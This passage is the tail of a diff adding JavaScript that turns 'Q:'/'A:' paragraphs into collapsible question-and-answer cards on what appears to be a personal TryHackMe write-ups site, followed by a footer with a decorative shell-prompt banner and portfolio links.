+    const aBadge = document.createElement('span');
+    aBadge.className = 'qa-a-badge';
+    aBadge.textContent = 'A';
+    aPanel.appendChild(aBadge);
+
+    const aBody = document.createElement('div');
+    aBody.className = 'qa-answer-body';
+
+    if (answerPara) {
+      // Strip "A:" prefix from the answer paragraph
+      const stripped = answerPara.innerHTML.replace(/^A:\s*/i, '').trim();
+      if (stripped) aBody.innerHTML = stripped;
+      // Trailing images / code
+      answerNodes.forEach(n => aBody.appendChild(n.cloneNode(true)));
+    } else {
+      aBody.innerHTML = '<em style="color:var(--text-dim)">—</em>';
+    }
+
+    aPanel.appendChild(aBody);
+    block.appendChild(aPanel);
+
+    /* ── Toggle ── */
+    btn.addEventListener('click', () => {
+      const isOpen = aPanel.classList.toggle('open');
+      btn.classList.toggle('open', isOpen);
+      btn.querySelector('span:last-child').textContent = isOpen ? 'hide answer' : 'reveal answer';
+    });
+
+    return block;
+  }
+
+  // Work on a snapshot so DOM mutations don't affect iteration
+  let children = Array.from(article.children);
+  let i = 0;
+
+  while (i < children.length) {
+    const el = children[i];
+
+    if (startsWithQ(el)) {
+      const questionNodes = [el]; // first node = Q: paragraph
+      let j = i + 1;
+
+      // Absorb everything until we hit A: or a heading or end
+      while (j < children.length && !startsWithA(children[j]) && !isHeading(children[j])) {
+        // Stop if we hit another Q: (back-to-back questions)
+        if (startsWithQ(children[j])) break;
+        questionNodes.push(children[j]);
+        j++;
+      }
+
+      let answerPara = null;
+      const answerNodes = [];
+
+      if (j < children.length && startsWithA(children[j])) {
+        answerPara = children[j];
+        j++;
+        // Absorb trailing images/code/blockquotes as part of answer
+        while (j < children.length &&
+               !startsWithQ(children[j]) &&
+               !startsWithA(children[j]) &&
+               !isHeading(children[j])) {
+          answerNodes.push(children[j]);
+          j++;
+        }
+      }
+
+      // Build card
+      const card = buildCard(questionNodes, answerPara, answerNodes);
+
+      // Insert before the first consumed node
+      article.insertBefore(card, el);
+
+      // Remove all consumed original nodes
+      [...questionNodes, ...(answerPara ? [answerPara] : []), ...answerNodes]
+        .forEach(n => { if (n.parentNode === article) article.removeChild(n); });
+
+      // Refresh snapshot after DOM mutation
+      children = Array.from(article.children);
+      // Find where the card landed and continue from there
+      i = children.indexOf(card) + 1;
+    } else {
+      i++;
+    }
+  }
+})();
+</script>
+
+<footer class="site-footer">
+  <div class="footer-inner">
+    <span class="footer-text"><span class="prompt">george@kali:~$</span> echo "George Nădejde · TryHackMe Writeups"</span>
+    <div class="footer-links">
+      <a href="https://georgenadejde.github.io" target="_blank" rel="noopener noreferrer">Portfolio</a>
+      <a href="https://github.com/georgenadejde" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
